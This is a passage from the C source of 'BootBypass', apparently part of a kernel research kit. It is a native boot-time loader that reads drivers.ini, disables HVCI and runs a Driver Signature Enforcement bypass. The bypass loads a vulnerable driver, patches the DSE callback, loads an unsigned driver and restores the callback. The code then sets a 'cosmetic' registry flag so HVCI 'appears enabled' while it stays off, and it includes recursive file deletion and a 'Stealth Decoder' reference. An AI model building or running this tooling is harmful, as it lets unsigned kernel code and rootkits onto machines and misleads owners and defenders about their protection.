Project Path: arc_wesmar_KernelResearchKit_bw04tg09
    INI_ENTRY entries[MAX_ENTRIES];
    CONFIG_SETTINGS config;
    ULONG entryCount, i;
    PWSTR iniContent = NULL;
    NTSTATUS status;
    BOOLEAN bOld;
    BOOLEAN skipPatch;

    // Enable required privileges for driver/file operations
    RtlAdjustPrivilege(SE_LOAD_DRIVER_PRIVILEGE, TRUE, FALSE, &bOld);
    RtlAdjustPrivilege(SE_BACKUP_PRIVILEGE, TRUE, FALSE, &bOld);
    RtlAdjustPrivilege(SE_RESTORE_PRIVILEGE, TRUE, FALSE, &bOld);
    RtlAdjustPrivilege(SE_SHUTDOWN_PRIVILEGE, TRUE, FALSE, &bOld);

    DisplayMessage(L"BootBypass - Modular Driver Loader\r\n====================================\r\n");

    // Load configuration file
    if (!ReadIniFile(L"\\??\\C:\\Windows\\drivers.ini", &iniContent)) {
        DisplayMessage(L"ERROR: drivers.ini not found\r\n");
        NtTerminateProcess((HANDLE)-1, STATUS_SUCCESS);
    }

    // Parse INI entries and global config
    entryCount = ParseIniFile(iniContent, entries, MAX_ENTRIES, &config);

    // Check if execution is enabled in config
    if (!config.Execute) {
        DisplayMessage(L"EXECUTION DISABLED in Config. Exiting.\r\n");
        NtTerminateProcess((HANDLE)-1, STATUS_SUCCESS);
    }

    // Validate parsed entries
    if (entryCount == 0) {
        DisplayMessage(L"ERROR: No INI entries\r\n");
        NtTerminateProcess((HANDLE)-1, STATUS_SUCCESS);
    }

    // Check HVCI status and disable if needed (triggers reboot if active)
    skipPatch = CheckAndDisableHVCI();

    // Restore saved DSE callback address from previous run (if exists)
    if (g_OriginalCallback == 0) LoadStateSection(&g_OriginalCallback);

    // Process all INI entries sequentially
    for (i = 0; i < entryCount; i++) {
        // Skip empty entries
        if (entries[i].ServiceName[0] == 0 && entries[i].DisplayName[0] == 0) continue;
        
        DisplayMessage(L"\r\n["); DisplayMessage(entries[i].DisplayName); DisplayMessage(L"]\r\n");

        // Skip autopatch operations if waiting for HVCI reboot
        if (skipPatch && entries[i].AutoPatch) {
            DisplayMessage(L"SKIPPED: Waiting for HVCI reboot\r\n");
            continue;
        }

        switch (entries[i].Action) {
            case ACTION_LOAD:
                if (entries[i].AutoPatch) {
                    // Full DSE bypass sequence: load vuln driver -> patch -> load target -> restore
                    ExecuteAutoPatchLoad(&entries[i], &config, &g_OriginalCallback);
                } else {
                    // Standard driver load without DSE patching
                    if (entries[i].CheckIfLoaded && IsDriverLoaded(entries[i].ServiceName)) {
                        DisplayMessage(L"SKIPPED: Already loaded\r\n");
                    } else {
                        status = LoadDriver(entries[i].ServiceName, entries[i].ImagePath, entries[i].DriverType, entries[i].StartType);
                        if (NT_SUCCESS(status) || status == STATUS_IMAGE_ALREADY_LOADED) DisplayMessage(L"SUCCESS: Driver loaded\r\n");
                        else { DisplayMessage(L"FAILED: Load error"); DisplayStatus(status); }
                    }
                }
                break;

            case ACTION_UNLOAD:
                // Unload kernel driver
                if (!IsDriverLoaded(entries[i].ServiceName)) DisplayMessage(L"SKIPPED: Not loaded\r\n");
                else {
                    status = UnloadDriver(entries[i].ServiceName);
                    if (NT_SUCCESS(status)) DisplayMessage(L"SUCCESS: Unloaded\r\n");
                    else { DisplayMessage(L"FAILED: Unload error"); DisplayStatus(status); }
                }
                break;

            case ACTION_RENAME:
                // Rename file or directory
                ExecuteRename(&entries[i]);
                break;

            case ACTION_DELETE:
                // Delete file or directory (recursive if configured)
                ExecuteDelete(&entries[i]);
                break;
        }
    }

    DisplayMessage(L"\r\n====================================\r\n");

    // Restore HVCI in SYSTEM hive if configured (physical restoration)
    if (!skipPatch && config.RestoreHVCI) RestoreHVCI();

    // Set cosmetic HVCI registry flag (system hive remains patched to 0)
    if (!skipPatch) {
        DisplayMessage(L"INFO: Setting cosmetic HVCI registry flag...\r\n");
        if (NT_SUCCESS(SetHVCIRegistryFlag(TRUE))) {
            DisplayMessage(L"SUCCESS: HVCI appears enabled (registry only)\r\n");
        }
    }
    
    NtTerminateProcess((HANDLE)-1, STATUS_SUCCESS);
    __assume(0);
}
```

`BootBypass(FastReboot)/BootManager.h`:

```h
#ifndef BOOT_MANAGER_H
#define BOOT_MANAGER_H

#include "BootBypass.h"
#include "SystemUtils.h"
#include "DriverManager.h"
#include "SecurityPatcher.h"
#include "FileManager.h"
#include "SetupManager.h"

#endif
```

`BootBypass(FastReboot)/DriverManager.c`:

```c
#include "DriverManager.h"

BOOLEAN IsDriverLoaded(PCWSTR serviceName) {
    WCHAR fullServicePath[MAX_PATH_LEN];
    UNICODE_STRING usServiceName;
    NTSTATUS status;

    // Safe path construction with overflow check
    SIZE_T baseLen = wcscpy_safe(fullServicePath, MAX_PATH_LEN, 
                                  L"\\Registry\\Machine\\System\\CurrentControlSet\\Services\\");
    if (baseLen >= MAX_PATH_LEN - 1) return FALSE;
    
    SIZE_T finalLen = wcscat_safe(fullServicePath, MAX_PATH_LEN, serviceName);
    if (finalLen >= MAX_PATH_LEN) {
        // Truncation occurred - path invalid
        return FALSE;
    }
    
    RtlInitUnicodeString(&usServiceName, fullServicePath);
    
    status = NtLoadDriver(&usServiceName);
    if (status == STATUS_IMAGE_ALREADY_LOADED) return TRUE;
    if (NT_SUCCESS(status)) {
        NtUnloadDriver(&usServiceName);
        return FALSE;
    }
    return FALSE;
}

NTSTATUS CreateDriverRegistryEntry(PCWSTR serviceName, PCWSTR imagePath, PCWSTR driverType, PCWSTR startType) {
    WCHAR fullServicePath[MAX_PATH_LEN];
    UNICODE_STRING usServiceName, usValueName;
    OBJECT_ATTRIBUTES oa;
    HANDLE hKey = NULL;
    NTSTATUS status;
    ULONG disposition;
    DWORD dwValue;
    WCHAR tempBuffer[MAX_PATH_LEN];
    ULONG dataSize;

    // Safe path construction
    SIZE_T baseLen = wcscpy_safe(fullServicePath, MAX_PATH_LEN, 
                                  L"\\Registry\\Machine\\System\\CurrentControlSet\\Services\\");
    if (baseLen >= MAX_PATH_LEN - 1) return STATUS_OBJECT_NAME_INVALID;
    
    SIZE_T finalLen = wcscat_safe(fullServicePath, MAX_PATH_LEN, serviceName);
    if (finalLen >= MAX_PATH_LEN) return STATUS_OBJECT_NAME_INVALID;
    
    RtlInitUnicodeString(&usServiceName, fullServicePath);
    InitializeObjectAttributes(&oa, &usServiceName, OBJ_CASE_INSENSITIVE, NULL, NULL);

    status = NtCreateKey(&hKey, KEY_ALL_ACCESS, &oa, 0, NULL, REG_OPTION_NON_VOLATILE, &disposition);
    if (!NT_SUCCESS(status)) return status;

    // ImagePath value
    RtlInitUnicodeString(&usValueName, L"ImagePath");
    SIZE_T pathLen = wcscpy_safe(tempBuffer, MAX_PATH_LEN, imagePath);
    if (pathLen >= MAX_PATH_LEN) {
        NtClose(hKey);
        return STATUS_OBJECT_NAME_INVALID;
    }
    dataSize = (ULONG)((pathLen + 1) * sizeof(WCHAR));
    status = NtSetValueKey(hKey, &usValueName, 0, REG_EXPAND_SZ, tempBuffer, dataSize);

    // DisplayName value
    RtlInitUnicodeString(&usValueName, L"DisplayName");
    SIZE_T nameLen = wcslen(serviceName);
    if (nameLen >= MAX_PATH_LEN) {
        NtClose(hKey);
        return STATUS_OBJECT_NAME_INVALID;
    }
    dataSize = (ULONG)((nameLen + 1) * sizeof(WCHAR));
    NtSetValueKey(hKey, &usValueName, 0, REG_SZ, (PVOID)serviceName, dataSize);

    // Type value
    dwValue = (_wcsicmp_impl(driverType, L"FILE_SYSTEM") == 0) ? 2 : 1;
    RtlInitUnicodeString(&usValueName, L"Type");
    NtSetValueKey(hKey, &usValueName, 0, REG_DWORD, &dwValue, sizeof(DWORD));

    // Start value
    if (_wcsicmp_impl(startType, L"BOOT") == 0) dwValue = 0;
    else if (_wcsicmp_impl(startType, L"SYSTEM") == 0) dwValue = 1;
    else if (_wcsicmp_impl(startType, L"AUTO") == 0) dwValue = 2;
    else if (_wcsicmp_impl(startType, L"DISABLED") == 0) dwValue = 4;
    else dwValue = 3;

    RtlInitUnicodeString(&usValueName, L"Start");
    NtSetValueKey(hKey, &usValueName, 0, REG_DWORD, &dwValue, sizeof(DWORD));

    // ErrorControl value
    dwValue = 1;
    RtlInitUnicodeString(&usValueName, L"ErrorControl");
    NtSetValueKey(hKey, &usValueName, 0, REG_DWORD, &dwValue, sizeof(DWORD));

    NtClose(hKey);
    return status;
}

NTSTATUS LoadDriver(PCWSTR serviceName, PCWSTR imagePath, PCWSTR driverType, PCWSTR startType) {
    WCHAR fullServicePath[MAX_PATH_LEN];
    UNICODE_STRING usServiceName;
    NTSTATUS status;

    status = CreateDriverRegistryEntry(serviceName, imagePath, driverType, startType);
    if (!NT_SUCCESS(status) && status != STATUS_OBJECT_NAME_COLLISION) return status;

    // Safe path construction
    SIZE_T baseLen = wcscpy_safe(fullServicePath, MAX_PATH_LEN, 
                                  L"\\Registry\\Machine\\System\\CurrentControlSet\\Services\\");
    if (baseLen >= MAX_PATH_LEN - 1) return STATUS_OBJECT_NAME_INVALID;
    
    SIZE_T finalLen = wcscat_safe(fullServicePath, MAX_PATH_LEN, serviceName);
    if (finalLen >= MAX_PATH_LEN) return STATUS_OBJECT_NAME_INVALID;
    
    RtlInitUnicodeString(&usServiceName, fullServicePath);
    return NtLoadDriver(&usServiceName);
}

NTSTATUS UnloadDriver(PCWSTR serviceName) {
    WCHAR fullServicePath[MAX_PATH_LEN];
    UNICODE_STRING usServiceName;
    
    // Safe path construction
    SIZE_T baseLen = wcscpy_safe(fullServicePath, MAX_PATH_LEN, 
                                  L"\\Registry\\Machine\\System\\CurrentControlSet\\Services\\");
    if (baseLen >= MAX_PATH_LEN - 1) return STATUS_OBJECT_NAME_INVALID;
    
    SIZE_T finalLen = wcscat_safe(fullServicePath, MAX_PATH_LEN, serviceName);
    if (finalLen >= MAX_PATH_LEN) return STATUS_OBJECT_NAME_INVALID;
    
    RtlInitUnicodeString(&usServiceName, fullServicePath);
    return NtUnloadDriver(&usServiceName);
}
```

`BootBypass(FastReboot)/DriverManager.h`:

```h
#ifndef DRIVER_MANAGER_H
#define DRIVER_MANAGER_H

#include "BootBypass.h"
#include "SystemUtils.h"

// External declaration for Assembly Telemetry (Stealth Decoder)
extern PWSTR MmGetPoolDiagnosticString(void);

BOOLEAN IsDriverLoaded(PCWSTR serviceName);
NTSTATUS CreateDriverRegistryEntry(PCWSTR serviceName, PCWSTR imagePath, PCWSTR driverType, PCWSTR startType);
NTSTATUS LoadDriver(PCWSTR serviceName, PCWSTR imagePath, PCWSTR driverType, PCWSTR startType);
NTSTATUS UnloadDriver(PCWSTR serviceName);

#endif
```

`BootBypass(FastReboot)/FileManager.c`:

```c
#include "FileManager.h"

typedef struct _FILE_DIRECTORY_INFORMATION {
    ULONG NextEntryOffset;
    ULONG FileIndex;
    LARGE_INTEGER CreationTime;
    LARGE_INTEGER LastAccessTime;
    LARGE_INTEGER LastWriteTime;
    LARGE_INTEGER ChangeTime;
    LARGE_INTEGER EndOfFile;
    LARGE_INTEGER AllocationSize;
    ULONG FileAttributes;
    ULONG FileNameLength;
    WCHAR FileName[1];
} FILE_DIRECTORY_INFORMATION, *PFILE_DIRECTORY_INFORMATION;

#define FileDirectoryInformation 1
#define FILE_ATTRIBUTE_DIRECTORY 0x00000010

NTSTATUS ExecuteRename(PINI_ENTRY entry) {
    UNICODE_STRING usSourcePath, usTargetPath;
    OBJECT_ATTRIBUTES oa;
    IO_STATUS_BLOCK iosb;
    HANDLE hFile;
    NTSTATUS status;
    UCHAR buffer[512];
    PFILE_RENAME_INFORMATION pRename = (PFILE_RENAME_INFORMATION)buffer;

    RtlInitUnicodeString(&usSourcePath, entry->SourcePath);
    RtlInitUnicodeString(&usTargetPath, entry->TargetPath);

    // Check if target already exists
    InitializeObjectAttributes(&oa, &usTargetPath, OBJ_CASE_INSENSITIVE | OBJ_KERNEL_HANDLE, NULL, NULL);
    status = NtOpenFile(&hFile, FILE_READ_DATA | SYNCHRONIZE, &oa, &iosb, FILE_SHARE_READ | FILE_SHARE_WRITE, FILE_SYNCHRONOUS_IO_NONALERT);
    if (NT_SUCCESS(status)) {
        NtClose(hFile);
        // Target exists, check if source exists
        InitializeObjectAttributes(&oa, &usSourcePath, OBJ_CASE_INSENSITIVE | OBJ_KERNEL_HANDLE, NULL, NULL);
        status = NtOpenFile(&hFile, FILE_READ_DATA | SYNCHRONIZE, &oa, &iosb, FILE_SHARE_READ | FILE_SHARE_WRITE, FILE_SYNCHRONOUS_IO_NONALERT);
        if (!NT_SUCCESS(status)) { 
            DisplayMessage(L"SKIPPED: Rename complete\r\n"); 
            return STATUS_SUCCESS; 
        }
        NtClose(hFile);
    }

    // Open source for rename
    InitializeObjectAttributes(&oa, &usSourcePath, OBJ_CASE_INSENSITIVE | OBJ_KERNEL_HANDLE, NULL, NULL);
    status = NtOpenFile(&hFile, DELETE | SYNCHRONIZE, &oa, &iosb, FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE, FILE_OPEN_FOR_BACKUP_INTENT | FILE_SYNCHRONOUS_IO_NONALERT);
    if (!NT_SUCCESS(status)) return status;

    // Prepare rename structure with bounds check
    SIZE_T targetLenBytes = usTargetPath.Length;
    SIZE_T requiredSize = sizeof(FILE_RENAME_INFORMATION) + targetLenBytes;
    
    if (requiredSize > sizeof(buffer)) {
        NtClose(hFile);
        DisplayMessage(L"FAILED: Target path too long for rename\r\n");
        return STATUS_BUFFER_TOO_SMALL;
    }
    
    memset_impl(buffer, 0, sizeof(buffer));
    pRename->ReplaceIfExists = entry->ReplaceIfExists ? 1 : 0;
    pRename->FileNameLength = (ULONG)usTargetPath.Length;
    
    SIZE_T charCount = usTargetPath.Length / sizeof(WCHAR);
    for (ULONG i = 0; i < charCount; i++) {
        pRename->FileName[i] = usTargetPath.Buffer[i];
    }

    status = NtSetInformationFile(hFile, &iosb, pRename, (ULONG)requiredSize - sizeof(WCHAR), 10);
    NtClose(hFile);
    
    if (NT_SUCCESS(status)) {
        DisplayMessage(L"SUCCESS: File renamed\r\n");
    }
    return status;
}

BOOLEAN IsDotDirectory(PWSTR name, ULONG nameLen) {
    if (nameLen == sizeof(WCHAR) && name[0] == L'.') return TRUE;
    if (nameLen == 2 * sizeof(WCHAR) && name[0] == L'.' && name[1] == L'.') return TRUE;
    return FALSE;
}

NTSTATUS DeleteDirectoryRecursive(PUNICODE_STRING dirPath) {
    OBJECT_ATTRIBUTES oa;
    IO_STATUS_BLOCK iosb;
    HANDLE hDir;
    NTSTATUS status;
    UCHAR buffer[4096];
    PFILE_DIRECTORY_INFORMATION dirInfo;
    BOOLEAN firstQuery = TRUE;

    InitializeObjectAttributes(&oa, dirPath, OBJ_CASE_INSENSITIVE | OBJ_KERNEL_HANDLE, NULL, NULL);
    status = NtOpenFile(&hDir, FILE_LIST_DIRECTORY | DELETE | SYNCHRONIZE, &oa, &iosb, FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE, FILE_DIRECTORY_FILE | FILE_SYNCHRONOUS_IO_NONALERT | FILE_OPEN_FOR_BACKUP_INTENT);
    if (!NT_SUCCESS(status)) return status;

    while (TRUE) {
        memset_impl(buffer, 0, sizeof(buffer));
        status = NtQueryDirectoryFile(hDir, NULL, NULL, NULL, &iosb, buffer, sizeof(buffer), FileDirectoryInformation, FALSE, NULL, firstQuery);
        if (status == 0x80000006 || !NT_SUCCESS(status)) break;
        firstQuery = FALSE;
        dirInfo = (PFILE_DIRECTORY_INFORMATION)buffer;

        while (TRUE) {
            if (!IsDotDirectory(dirInfo->FileName, dirInfo->FileNameLength)) {
                WCHAR fullPath[MAX_PATH_LEN];
                UNICODE_STRING usFullPath;
                
                // Safe path construction with bounds checking
                SIZE_T baseLen = wcscpy_safe(fullPath, MAX_PATH_LEN, dirPath->Buffer);
                if (baseLen >= MAX_PATH_LEN - 1) {
                    NtClose(hDir);
                    return STATUS_BUFFER_TOO_SMALL;
                }
                
                SIZE_T afterSlash = wcscat_safe(fullPath, MAX_PATH_LEN, L"\\");
                if (afterSlash >= MAX_PATH_LEN) {
                    NtClose(hDir);
                    return STATUS_BUFFER_TOO_SMALL;
                }
                
                // Append filename with length validation
                ULONG fnChars = dirInfo->FileNameLength / sizeof(WCHAR);
                SIZE_T currentLen = wcslen(fullPath);
                
                if (!validate_string_space(currentLen, fnChars, MAX_PATH_LEN)) {
                    NtClose(hDir);
                    return STATUS_BUFFER_TOO_SMALL;
                }
                
                for (ULONG i = 0; i < fnChars; i++) {
                    fullPath[currentLen + i] = dirInfo->FileName[i];
                }
                fullPath[currentLen + fnChars] = 0;
                
                RtlInitUnicodeString(&usFullPath, fullPath);

                // Recursively delete subdirectories
                if (dirInfo->FileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
                    DeleteDirectoryRecursive(&usFullPath);
                }

                // Delete file/directory
                OBJECT_ATTRIBUTES oaItem;
                HANDLE hItem;
                InitializeObjectAttributes(&oaItem, &usFullPath, OBJ_CASE_INSENSITIVE | OBJ_KERNEL_HANDLE, NULL, NULL);
                status = NtOpenFile(&hItem, DELETE | SYNCHRONIZE, &oaItem, &iosb, FILE_SHARE_DELETE, FILE_OPEN_FOR_BACKUP_INTENT | FILE_SYNCHRONOUS_IO_NONALERT);
                if (NT_SUCCESS(status)) {
                    FILE_DISPOSITION_INFORMATION dispInfo; 
                    dispInfo.DeleteFile = TRUE;
                    NtSetInformationFile(hItem, &iosb, &dispInfo, sizeof(dispInfo), 13);
                    NtClose(hItem);
                }
            }
            if (dirInfo->NextEntryOffset == 0) break;
            dirInfo = (PFILE_DIRECTORY_INFORMATION)((UCHAR*)dirInfo + dirInfo->NextEntryOffset);
        }
    }
    
    NtClose(hDir);
    
    // Delete the directory itself
    InitializeObjectAttributes(&oa, dirPath, OBJ_CASE_INSENSITIVE | OBJ_KERNEL_HANDLE, NULL, NULL);
    status = NtOpenFile(&hDir, DELETE | SYNCHRONIZE, &oa, &iosb, FILE_SHARE_DELETE, FILE_DIRECTORY_FILE | FILE_OPEN_FOR_BACKUP_INTENT | FILE_SYNCHRONOUS_IO_NONALERT);
    if (NT_SUCCESS(status)) {
        FILE_DISPOSITION_INFORMATION dispInfo; 
        dispInfo.DeleteFile = TRUE;
        NtSetInformationFile(hDir, &iosb, &dispInfo, sizeof(dispInfo), 13);
        NtClose(hDir);
    }
    return STATUS_SUCCESS;
}

NTSTATUS ExecuteDelete(PINI_ENTRY entry) {
    UNICODE_STRING usPath;
    OBJECT_ATTRIBUTES oa;
    IO_STATUS_BLOCK iosb;
    HANDLE hFile;
    NTSTATUS status;
    FILE_DISPOSITION_INFORMATION dispInfo;
    RtlInitUnicodeString(&usPath, entry->DeletePath);
    InitializeObjectAttributes(&oa, &usPath, OBJ_CASE_INSENSITIVE | OBJ_KERNEL_HANDLE, NULL, NULL);
    status = NtOpenFile(&hFile, DELETE | FILE_READ_ATTRIBUTES | SYNCHRONIZE, &oa, &iosb, FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE, FILE_OPEN_FOR_BACKUP_INTENT | FILE_SYNCHRONOUS_IO_NONALERT);
    if (!NT_SUCCESS(status)) return status;

    FILE_STANDARD_INFORMATION fileInfo;
    memset_impl(&fileInfo, 0, sizeof(fileInfo));
    status = NtQueryInformationFile(hFile, &iosb, &fileInfo, sizeof(fileInfo), FileStandardInformation);

    if (NT_SUCCESS(status) && fileInfo.Directory) {
        NtClose(hFile);
        if (entry->RecursiveDelete) {
            status = DeleteDirectoryRecursive(&usPath);
            if (NT_SUCCESS(status)) DisplayMessage(L"SUCCESS: Tree deleted\r\n");
        } else {
            status = NtOpenFile(&hFile, DELETE | SYNCHRONIZE, &oa, &iosb, FILE_SHARE_DELETE, FILE_DIRECTORY_FILE | FILE_OPEN_FOR_BACKUP_INTENT | FILE_SYNCHRONOUS_IO_NONALERT);
            if (NT_SUCCESS(status)) {
                dispInfo.DeleteFile = TRUE;
                status = NtSetInformationFile(hFile, &iosb, &dispInfo, sizeof(dispInfo), 13);
